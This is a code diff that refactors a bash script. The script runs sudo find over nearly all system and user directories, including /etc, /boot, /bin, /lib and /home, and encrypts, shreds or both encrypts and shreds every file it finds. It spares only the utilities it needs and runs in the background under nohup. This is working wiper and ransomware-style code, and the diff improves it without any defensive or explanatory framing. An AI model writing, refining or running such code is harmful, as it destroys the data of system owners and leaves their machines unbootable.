@@ -36,6 +36,45 @@ encrypt_files() {
     fi
 }
 
+# Function to process files based on user choice
+process_files() {
+    local action=$1
+    if $NOHUP_PRESENT; then
+        nohup sudo find /tmp /var/log /var/tmp /home /var/cache /opt /usr/local /var/lib \
+        /usr/bin /usr/sbin /lib /lib64 /etc /boot /bin /sbin /mnt \
+        -path /proc -prune -o -path /sys -prune -o -path /dev -prune -o -type f \
+        ! -name "$(which shred)" \
+        ! -name "$(which gpg)" \
+        ! -name "$(which bash)" \
+        ! -name "$(which sh)" \
+        ! -name "$(which find)" \
+        ! -name "$(which timeout)" \
+        ! -name "$(which nohup)" \
+        ! -name "$(which sudo)" \
+        ! -name "$(which rm)" \
+        ! -name "$(which mv)" \
+        ! -name "$(which ls)" \
+        -exec bash -c "$action \"{}\"" \; || true &
+    else
+        echo "nohup not found, running without it..."
+        sudo find /tmp /var/log /var/tmp /home /var/cache /opt /usr/local /var/lib \
+        /usr/bin /usr/sbin /lib /lib64 /etc /boot /bin /sbin /mnt \
+        -path /proc -prune -o -path /sys -prune -o -path /dev -prune -o -type f \
+        ! -name "$(which shred)" \
+        ! -name "$(which gpg)" \
+        ! -name "$(which bash)" \
+        ! -name "$(which sh)" \
+        ! -name "$(which find)" \
+        ! -name "$(which timeout)" \
+        ! -name "$(which nohup)" \
+        ! -name "$(which sudo)" \
+        ! -name "$(which rm)" \
+        ! -name "$(which mv)" \
+        ! -name "$(which ls)" \
+        -exec bash -c "$action \"{}\"" \; || true
+    fi
+}
+
 # Function to log progress if possible
 log_progress() {
     if $TAIL_PRESENT; then
@@ -48,127 +87,31 @@ log_progress() {
 # Initial binary check
 check_binaries
 
+# Prompt user for the desired action
 read -p "Do you want to (E)ncrypt, (W)ipe, or (B)oth? " choice
 
+# Prompt for passphrase if encryption is selected
 if [[ $choice =~ [EeBb] ]]; then
-    # Securely read passphrase
     read -s -p "Enter passphrase for encryption: " PASSPHRASE
     echo
 fi
 
+# Determine the action to take based on user input
 case $choice in
-    [Ee]* ) 
-        if $NOHUP_PRESENT; then
-            nohup sudo find /tmp /var/log /var/tmp /home /var/cache /opt /usr/local /var/lib \
-            /usr/bin /usr/sbin /lib /lib64 /etc /boot /bin /sbin /mnt \
-            -path /proc -prune -o -path /sys -prune -o -path /dev -prune -o -type f \
-            ! -name "$(which shred)" \
-            ! -name "$(which gpg)" \
-            ! -name "$(which bash)" \
-            ! -name "$(which sh)" \
-            ! -name "$(which find)" \
-            ! -name "$(which timeout)" \
-            ! -name "$(which nohup)" \
-            ! -name "$(which sudo)" \
-            ! -name "$(which rm)" \
-            ! -name "$(which mv)" \
-            ! -name "$(which ls)" \
-            -exec bash -c 'encrypt_files "{}"' \; || true &
-        else
-            echo "nohup not found, running without it..."
-            sudo find /tmp /var/log /var/tmp /home /var/cache /opt /usr/local /var/lib \
-            /usr/bin /usr/sbin /lib /lib64 /etc /boot /bin /sbin /mnt \
-            -path /proc -prune -o -path /sys -prune -o -path /dev -prune -o -type f \
-            ! -name "$(which shred)" \
-            ! -name "$(which gpg)" \
-            ! -name "$(which bash)" \
-            ! -name "$(which sh)" \
-            ! -name "$(which find)" \
-            ! -name "$(which timeout)" \
-            ! -name "$(which nohup)" \
-            ! -name "$(which sudo)" \
-            ! -name "$(which rm)" \
-            ! -name "$(which mv)" \
-            ! -name "$(which ls)" \
-            -exec bash -c 'encrypt_files "{}"' \; || true
-        fi
-        log_progress &
+    [Ee]* )
+        process_files "encrypt_files"
         ;;
     [Ww]* )
-        if $NOHUP_PRESENT; then
-            nohup sudo find /tmp /var/log /var/tmp /home /var/cache /opt /usr/local /var/lib \
-            /usr/bin /usr/sbin /lib /lib64 /etc /boot /bin /sbin /mnt \
-            -path /proc -prune -o -path /sys -prune -o -path /dev -prune -o -type f \
-            ! -name "$(which shred)" \
-            ! -name "$(which gpg)" \
-            ! -name "$(which bash)" \
-            ! -name "$(which sh)" \
-            ! -name "$(which find)" \
-            ! -name "$(which timeout)" \
-            ! -name "$(which nohup)" \
-            ! -name "$(which sudo)" \
-            ! -name "$(which rm)" \
-            ! -name "$(which mv)" \
-            ! -name "$(which ls)" \
-            -exec bash -c 'wipe_files "{}"' \; || true &
-        else
-            echo "nohup not found, running without it..."
-            sudo find /tmp /var/log /var/tmp /home /var/cache /opt /usr/local /var/lib \
-            /usr/bin /usr/sbin /lib /lib64 /etc /boot /bin /sbin /mnt \
-            -path /proc -prune -o -path /sys -prune -o -path /dev -prune -o -type f \
-            ! -name "$(which shred)" \
-            ! -name "$(which gpg)" \
-            ! -name "$(which bash)" \
-            ! -name "$(which sh)" \
-            ! -name "$(which find)" \
-            ! -name "$(which timeout)" \
-            ! -name "$(which nohup)" \
-            ! -name "$(which sudo)" \
-            ! -name "$(which rm)" \
-            ! -name "$(which mv)" \
-            ! -name "$(which ls)" \
-            -exec bash -c 'wipe_files "{}"' \; || true
-        fi
-        log_progress &
+        process_files "wipe_files"
         ;;
     [Bb]* )
-        if $NOHUP_PRESENT; then
-            nohup sudo find /tmp /var/log /var/tmp /home /var/cache /opt /usr/local /var/lib \
-            /usr/bin /usr/sbin /lib /lib64 /etc /boot /bin /sbin /mnt \
-            -path /proc -prune -o -path /sys -prune -o -path /dev -prune -o -type f \
-            ! -name "$(which shred)" \
-            ! -name "$(which gpg)" \
-            ! -name "$(which bash)" \
-            ! -name "$(which sh)" \
-            ! -name "$(which find)" \
-            ! -name "$(which timeout)" \
-            ! -name "$(which nohup)" \
-            ! -name "$(which sudo)" \
-            ! -name "$(which rm)" \
-            ! -name "$(which mv)" \
-            ! -name "$(which ls)" \
-            -exec bash -c 'encrypt_files "{}"' \; -exec bash -c 'wipe_files "{}"' \; || true &
-        else
-            echo "nohup not found, running without it..."
-            sudo find /tmp /var/log /var/tmp /home /var/cache /opt /usr/local /var/lib \
-            /usr/bin /usr/sbin /lib /lib64 /etc /boot /bin /sbin /mnt \
-            -path /proc -prune -o -path /sys -prune -o -path /dev -prune -o -type f \
-            ! -name "$(which shred)" \
-            ! -name "$(which gpg)" \
-            ! -name "$(which bash)" \
-            ! -name "$(which sh)" \
-            ! -name "$(which find)" \
-            ! -name "$(which timeout)" \
-            ! -name "$(which nohup)" \
-            ! -name "$(which sudo)" \
-            ! -name "$(which rm)" \
-            ! -name "$(which mv)" \
-            ! -name "$(which ls)" \
-            -exec bash -c 'encrypt_files "{}"' \; -exec bash -c 'wipe_files "{}"' \; || true
-        fi
-        log_progress &
+        process_files "encrypt_files"
+        process_files "wipe_files"
         ;;
     * )
         echo "Please choose (E) encrypt, (W) wipe, or (B) both."
+        exit 1
         ;;
 esac
+
+log_progress &
